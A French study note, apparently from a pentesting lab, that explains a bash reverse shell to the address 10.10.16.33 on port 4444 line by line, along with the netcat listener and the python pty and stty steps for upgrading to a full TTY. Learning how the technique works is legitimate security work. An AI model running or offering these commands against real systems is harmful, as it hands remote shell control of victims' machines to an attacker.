Commande étudiée :

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.33/4444 0>&1'
```


---

## 🧠 Principe général

Flux de données :

```
[ Clavier attaquant ] ──> (TCP) ──> stdin bash victime
[ stdout / stderr bash victime ] ──> (TCP) ──> écran attaquant
```

Tout passe par une seule connexion TCP.

---

## 🔹 Décomposition de la commande

### 1️⃣ `bash -c '...'`

- `bash` : lance un interpréteur bas
- `-c` : exécute la commande passée en argument

👉 Permet d’exécuter proprement une commande complexe avec redirections.

---

### 2️⃣ `bash -i`

- Lance un nouveau shell bash
- `-i` = **interactive**

Sans `-i` :

- Pas de prompt
- Comportement instable

👉 Indispensable pour avoir un vrai shell utilisable.

---

### 3️⃣ `/dev/tcp/10.10.16.33/4444`

Fonctionnalité spéciale de bash :

```bash
/dev/tcp/IP/PORT
```

➡️ Ouvre une **connexion TCP sortante** vers l’adresse indiquée.

Ici :
- IP attaquant : `10.10.16.33`
- Port : `4444`

---

### 4️⃣ `>& /dev/tcp/...`

Redirection :

- `>` : redirige stdout (fd 1)
- `2>` : redirige stderr (fd 2)
- `>&` : redirige **stdout + stderr**

Donc :

```bash
bash -i >& /dev/tcp/10.10.16.33/4444
```

➡️ Toute la sortie du shell (résultats + erreurs) est envoyée vers la connexion TCP.

---

### 5️⃣ `0>&1`

Rappel des descripteurs :

|FD|Nom|
|---|---|
|0|stdin|
|1|stdout|
|2|stderr|

Commande :

```bash
0>&1
```

➡️ Redirige **stdin (0)** vers **stdout (1)**

Mais comme stdout est déjà redirigé vers le socket TCP…

👉 L’entrée du shell vient maintenant du **réseau**.

---

## 🔁 Résultat final

Après toutes les redirections :

- stdout → TCP → attaquant
- stderr → TCP → attaquant
- stdin ← TCP ← attaquant

➡️ Tu contrôles entièrement le shell distant.

---

## 🖥️ Côté attaquant

Listener typique :

```bash
nc -lvnp 4444
```

Quand la victime exécute la commande :

🎯 Tu obtiens un shell interactif.

---

## ⚠️ Limitations

- Pas de vrai TTY
- Problèmes possibles avec :
    - `su`, `sudo`
    - `nano`, `vim`
    - Ctrl+C instable

---

## 🔧 Upgrade du shell (recommandé)

Une fois connecté :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Puis côté attaquant :

```bash
Ctrl+Z
stty raw -echo
fg
export TERM=xterm
```

➡️ Tu obtiens un **TTY quasi complet**.

---
